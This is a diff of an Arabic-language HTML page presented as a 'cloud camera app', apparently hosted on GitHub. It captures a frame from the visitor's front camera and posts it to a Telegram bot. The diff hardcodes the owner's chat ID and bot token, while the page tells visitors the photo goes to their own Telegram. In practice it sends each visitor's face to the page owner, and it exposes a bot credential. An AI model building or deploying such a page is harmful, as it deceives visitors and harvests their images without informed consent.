@@ -3,31 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال صورة للتليجرام</title>
+    <title>تطبيق الكاميرا السحابي</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #2c3e50; color: white; }
-        .card { background: #34495e; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; width: 90%; max-width: 400px; }
-        button { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 1.1rem; font-weight: bold; width: 100%; transition: 0.3s; }
-        button:hover { background: #00aaff; transform: scale(1.02); }
-        #status { margin-top: 20px; font-size: 0.9rem; color: #bdc3c7; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            background: #1a1a2e; 
+            color: white; 
+        }
+        .card { 
+            background: #16213e; 
+            padding: 40px; 
+            border-radius: 25px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
+            text-align: center; 
+            width: 90%; 
+            max-width: 400px; 
+            border: 1px solid #0f3460;
+        }
+        h2 { margin-bottom: 10px; color: #e94560; }
+        p { color: #95a5a6; font-size: 0.9rem; line-height: 1.6; }
+        button { 
+            background: #e94560; 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-size: 1.1rem; 
+            font-weight: bold; 
+            width: 100%; 
+            transition: 0.3s; 
+            margin-top: 20px;
+        }
+        button:hover { background: #ff4d6d; transform: translateY(-3px); }
+        #status { margin-top: 20px; font-size: 0.85rem; color: #00d2ff; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>كاميرا البوت 🤖</h2>
-    <p>اضغط على الزر أدناه لالتقاط صورة وإرسالها إلى حسابك مباشرة.</p>
+    <h2>مرحباً بك 🤖</h2>
+    <p>اضغط على الزر أدناه لتجربة التقاط الصورة وإرسالها إلى التلجرام الخاص بك.</p>
     <button id="capture-btn">إرسال صورة الآن 📸</button>
-    <div id="status">جاهز للإرسال...</div>
+    <div id="status">جاهز للعمل..</div>
 </div>
 
 <canvas id="canvas"></canvas>
 
 <script>
-    // بيانات البوت التي زودتني بها
+    // البيانات الخاصة بك مدمجة وجاهزة
     const TELEGRAM_TOKEN = '8728314672:AAFTjj5mEdbraaqtBxpfQoVFrNr79fgiYug';
-    const CHAT_ID = 'ضع_هنا_رقم_الآيدي_الخاص_بك'; // استبدل هذا الرقم بالرقم الذي حصلت عليه
+    const CHAT_ID = '8169635171'; 
 
     const captureBtn = document.getElementById('capture-btn');
     const statusText = document.getElementById('status');
@@ -35,36 +67,36 @@
     const ctx = canvas.getContext('2d');
 
     captureBtn.addEventListener('click', async function() {
-        if(CHAT_ID === 'ضع_هنا_رقم_الآيدي_الخاص_بك') {
-            alert('من فضلك ضع رقم الـ Chat ID أولاً في الكود!');
-            return;
-        }
-
-        statusText.innerText = "⚡ جاري تشغيل الكاميرا...";
+        statusText.innerText = "⚡ جاري فتح الكاميرا...";
         
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // طلب الوصول للكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            statusText.innerText = "📸 التقاط وإرسال...";
+            statusText.innerText = "📸 التقطت! جاري الإرسال...";
 
-            // انتظار ثانية واحدة لضبط جودة الصورة
+            // تأخير ثانية لضمان جودة الصورة
             setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // إغلاق الكاميرا فوراً
+                // إيقاف الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
 
-                // تحويل الصورة وإرسالها
+                // تحويل الصورة وإرسالها للتلجرام
                 canvas.toBlob(function(blob) {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'image.png');
-                    formData.append('caption', '✅ صورة جديدة ملتقطة من الموقع');
+                    formData.append('photo', blob, 'capture.png');
+                    formData.append('caption', '🚀 تم استقبال صورة جديدة من موقعك على GitHub!');
 
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -73,15 +105,14 @@
                     .then(res => res.json())
                     .then(data => {
                         if (data.ok) {
-                            statusText.innerText = "🚀 تم الإرسال بنجاح!";
+                            statusText.innerText = "✅ وصلت الصورة إلى حسابك!";
                             statusText.style.color = "#2ecc71";
                         } else {
                             statusText.innerText = "❌ خطأ: " + data.description;
-                            statusText.style.color = "#e74c3c";
                         }
                     })
                     .catch(err => {
-                        statusText.innerText = "❌ فشل الاتصال بتلجرام";
+                        statusText.innerText = "❌ فشل الاتصال بالخادم";
                         console.error(err);
                     });
                 }, 'image/png');
@@ -89,7 +120,7 @@
             }, 1000);
 
         } catch (error) {
-            statusText.innerText = "❌ الكاميرا غير متاحة (تأكد من HTTPS)";
+            statusText.innerText = "❌ يجب السماح بالكاميرا واستخدام HTTPS";
             console.error(error);
         }
     });
